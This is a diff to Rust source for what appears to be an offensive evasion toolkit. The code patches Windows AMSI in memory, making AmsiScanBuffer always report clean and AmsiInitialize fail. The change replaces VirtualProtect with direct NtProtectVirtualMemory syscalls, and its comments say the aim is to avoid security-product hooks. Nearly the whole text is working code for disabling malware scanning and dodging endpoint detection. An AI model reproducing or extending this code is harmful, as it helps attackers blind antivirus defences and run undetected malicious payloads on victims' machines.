@@ -41,10 +41,29 @@ pub fn orchestrate_layers() -> bool {
 }
 
 /// Patch AmsiScanBuffer in-process with `xor eax,eax; ret` to force AMSI_RESULT_CLEAN.
+///
+/// Uses `NtProtectVirtualMemory` via `nt_syscall` instead of `VirtualProtect`
+/// to avoid IAT hooks on kernel32's VirtualProtect thunk.
 #[cfg(windows)]
 fn apply_memory_patch() {
-    use winapi::um::memoryapi::VirtualProtect;
     use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
+
+    /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
+    /// Returns `true` on success (NTSTATUS >= 0).
+    #[inline(always)]
+    unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
+        let mut prot_base = base;
+        let mut prot_size = size;
+        let status = nt_syscall::syscall!(
+            "NtProtectVirtualMemory",
+            (-1isize) as u64,                      // NtCurrentProcess()
+            &mut prot_base as *mut _ as u64,
+            &mut prot_size as *mut _ as u64,
+            new_prot as u64,
+            old_prot as *mut u32 as u64,
+        );
+        status.map_or(false, |s| s >= 0)
+    }
 
     unsafe {
         // Use pe_resolve (PEB walk + hash) to avoid IAT-hookable GetModuleHandleW.
@@ -74,20 +93,13 @@ fn apply_memory_patch() {
         // xor eax, eax (0x31 0xC0) ; ret (0xC3)
         let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
         let mut old_protect: u32 = 0;
-        if VirtualProtect(
-            scan_buf as _,
-            patch.len(),
-            PAGE_EXECUTE_READWRITE,
-            &mut old_protect,
-        ) != 0
-        {
+        if nt_protect(scan_buf, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_buf as *mut u8, patch.len());
-            VirtualProtect(scan_buf as _, patch.len(), old_protect, &mut old_protect);
+            nt_protect(scan_buf, patch.len(), old_protect, &mut old_protect);
             log::debug!("apply_memory_patch: AmsiScanBuffer patched");
         } else {
             log::warn!(
-                "apply_memory_patch: VirtualProtect failed: {}",
-                winapi::um::errhandlingapi::GetLastError()
+                "apply_memory_patch: NtProtectVirtualMemory failed for AmsiScanBuffer"
             );
         }
 
@@ -98,9 +110,9 @@ fn apply_memory_patch() {
         {
             let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
             let mut op: u32 = 0;
-            if VirtualProtect(scan_str as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) != 0 {
+            if nt_protect(scan_str, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) {
                 std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_str as *mut u8, patch.len());
-                VirtualProtect(scan_str as _, patch.len(), op, &mut op);
+                nt_protect(scan_str, patch.len(), op, &mut op);
             }
         }
         let _ = hmod;
@@ -161,9 +173,27 @@ pub fn cleanup_com_hijack() {
 
 /// Set the g_AmsiContext initialization flag to indicate failure so any
 /// AmsiInitialize call in the current process reports an error.
+///
+/// Uses `NtProtectVirtualMemory` via `nt_syscall` instead of `VirtualProtect`
+/// to avoid IAT hooks on kernel32's VirtualProtect thunk.
 #[cfg(windows)]
 fn set_init_failed_flag() {
-    use winapi::um::memoryapi::VirtualProtect;
+    /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
+    /// Returns `true` on success (NTSTATUS >= 0).
+    #[inline(always)]
+    unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
+        let mut prot_base = base;
+        let mut prot_size = size;
+        let status = nt_syscall::syscall!(
+            "NtProtectVirtualMemory",
+            (-1isize) as u64,                      // NtCurrentProcess()
+            &mut prot_base as *mut _ as u64,
+            &mut prot_size as *mut _ as u64,
+            new_prot as u64,
+            old_prot as *mut u32 as u64,
+        );
+        status.map_or(false, |s| s >= 0)
+    }
 
     unsafe {
         let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
@@ -186,16 +216,19 @@ fn set_init_failed_flag() {
             0xC3, // ret
         ];
         let mut old: u32 = 0;
-        if VirtualProtect(
-            init_fn as _,
+        if nt_protect(
+            init_fn,
             patch.len(),
             winapi::um::winnt::PAGE_EXECUTE_READWRITE,
             &mut old,
-        ) != 0
-        {
+        ) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
-            VirtualProtect(init_fn as _, patch.len(), old, &mut old);
+            nt_protect(init_fn, patch.len(), old, &mut old);
             log::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
+        } else {
+            log::warn!(
+                "set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize"
+            );
         }
     }
 }
